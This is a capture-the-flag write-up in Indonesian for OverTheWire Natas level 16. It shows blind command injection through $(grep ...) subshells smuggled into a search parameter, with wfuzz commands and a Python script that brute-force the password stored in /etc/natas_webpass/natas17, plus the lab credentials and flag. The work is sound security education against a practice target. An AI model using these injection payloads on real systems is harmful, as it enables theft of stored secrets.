---
layout: default
level: 16
name_file: level
---

{% include level-section.html %}

# soal
Username: natas16
URL:      http://natas16.natas.labs.overthewire.org

# solve 
- login with cred natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
- lalu saya melihat source codenya
  ![alt text](docs/images/image-50.png)
- jika kita lihat disini seperti tantangan yang sebelumnya
- namun ketika saya coba seperti sebelumnya itu tidak berhasil
  ![alt text](docs/images/image-51.png)
- lalu saya mencari tentang sub shell, dan mencoba ini
  ![alt text](docs/images/image-52.png)
  ```bash
  grep $(echo a) dictionary.txt 
  # maka dictionary akan tampil

  # dan secara teori fungsi "$(coommand)" adalah subshell
  # yang dimana jika saya lakukan cat $(file1.txt) file2.txt
  ```
- dan saya ingin mencoba mencari tau dengan grep di dalam grep
  - jadi ketika saya ```grep $(grep a /etc/natas_webpass/natas17) dictionary.txt```
  - saya berharap ketika saya grep a pada password natas17 dan jika memang ada filenya dan
    - dan hasil dari output subshell misal ```afdadfafas``` akan di lakukan ```grep -i fafadfafa dictionary.txt```
  - yang secara teori hasilnya akan kosong
- nah disini saya mencoba dulu apakah benar berhasil
  ![alt text](docs/images/image-53.png)
  ![alt text](docs/images/image-54.png)
  ```bash
  $(grep a /etc/natas_webpass/natas17) # showing     ==> false
  $(grep b /etc/natas_webpass/natas17) # not showing ==> true
  ```
- disini jika kita coba ketika grep a tidak ada asumsi paswword tidak menggunakan a dan karena tidak ada ketika di grep yang kedua dia akan melakukan grep a
- sedangkan ketika coba b tidak muncul yang berarti grep yang pertama berhasil, lalu gagal di kedua makanya kosong
- dan sebnernya kalo di cli kalo run kaya gitu ada error jika teksnya itu tidak ada di grep yang pertama
  - solusinya tambahkan string di akhir
    ```bash
    $(grep a /etc/natas_webpass/natas17)a
    ```
- hanya saja masalahnya kita tidak tahu huruf itu adalah huruf pertama atau terakhir
  - dan saya menemukan solusi kita bisa gunakan regex
    ```bash
    $(grep ^b /etc/natas_webpass/natas17)a
    ```
- lalu saya mencoba menggunakan wfuzz untuk menbrute force 1 kata per kata
  ```bash
  wfuzz -H "Authorization: Basic bmF0YXMxNjpoUGtqS1l2aUxRY3RFVzMzUW11WEw2ZURWZk1XNHNHbw==" -w chars -u 'natas16.natas.labs.overthewire.org/?needle=$(grep ^FUZZ /etc/natas_webpass/natas17)a&submit=Search'
  # output all

  | grep -v 24202 # grep output
  | grep -v 24202 | tr -d "L" # hapus karakter L karena tiba tiba ada karakter L
  | grep -v 24202 | tr -d "L" | tr -d "\n" # hapus nweline
  
  $(grep ^FUZZ /etc/natas_webpass/natas17)
  # 000000031:   200        28      79 W       1105 Ch     "E"
  $(grep ^EFUZZ /etc/natas_webpass/natas17)
  # 000000017:   200        28      79 W       1105 Ch     "q"
  # dan seterusnya
  # EqjHJbo7LF
  # EqjHJbo7LFNb8vw
  # EqjHJbo7LFNb8vwhHb9s75
  # EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC

  # dan ternyata sudah uruf 30+ yang berarti sudah ketemu passwordnya

  wfuzz -H "Authorization: Basic bmF0YXMxNjpoUGtqS1l2aUxRY3RFVzMzUW11WEw2ZURWZk1XNHNHbw==" -w chars -u 'natas16.natas.labs.overthewire.org/?needle=$(grep ^EqjHJbo7LFNb8vwhHb9s75hokh5TF0OFUZZ /etc/natas_webpass/natas17)a&submit=Search' | grep -v 24202
  # EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
  ```

## solve with script python
- script
  ```py
  import requests
  from string import ascii_letters, digits

  url = "http://natas16.natas.labs.overthewire.org"
  username = "natas16"
  password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"

  def brute_force_chars():
      charset = ascii_letters + digits
      found_password = ""

      while True:
          for char in charset:
              test_password = found_password + char
              payload = f"$(grep ^{test_password} /etc/natas_webpass/natas17)a"

              response = requests.get(
                  url,
                  auth=(username, password),
                  params={"needle": payload, "submit": "Search"}
              )

              if "African" not in response.text:
                  found_password += char
                  print(f"[+] Password so far: {found_password}")
                  break
          else:
              print("[+] Password found:", found_password)
              return

  if __name__ == "__main__":
      brute_force_chars()
  ```
- run
  ```bash
  python3 overthewire/natas/solve/level16.py 
  [+] Password so far: E
  [+] Password so far: Eq
  [+] Password so far: Eqj
  [+] Password so far: EqjH
  ......
  [+] Password so far: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
  ```

## subshell
```bash
cat pass
ariafatah

grep -i $(grep a pass) dictionary # not show because in pass have char a
grep -i $(grep b pass) dictionary # not showing because not have b in chat but stuck loading
^C

grep -i $(grep b pass)a dictionary | head # solusinya menambahkan string lagi di akhir
# African
# Africans

# fungsi string akhir itu biar ketika kita tidak menemukan huruf b pada pass dan ketika dia melakukan pengecekan
# kosong dari dictionary maka seharusnya akan menambahkan huruf a gitu
# jadi nanti hasilnya bakal grep -i a dictionary
# dan bukan grep -i  dictionary

# ya intinya fungsinya subshell akan dijalankan terlebih dahulu
# setelah itu hasil dari subshell akan dibaca oleh cat lalu, akan melanjutkan comman selanjutnya

grep -i $(grep ^ariafatah pass)a dictionary | head # true
grep -i $(grep ^aria pass)a dictionary | head # true
grep -i $(grep ^fatah pass)a dictionary | head # false
# African
# Africans

# sebenerya ada tamabahn option biar lebih spesifik untuk regexnya
grep -E ^a.*$

grep -i $(grep -E ^aria.*$  pass)a dictionary | head
grep -i $(grep -E ^ariafatah.*$  pass)a dictionary | head
grep -i $(grep -E ^ariafataha.*$  pass)a dictionary | head
# African
# Africans

## namun hasilnya akan tetap sama aja sih sebenernya
```

# flag
EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC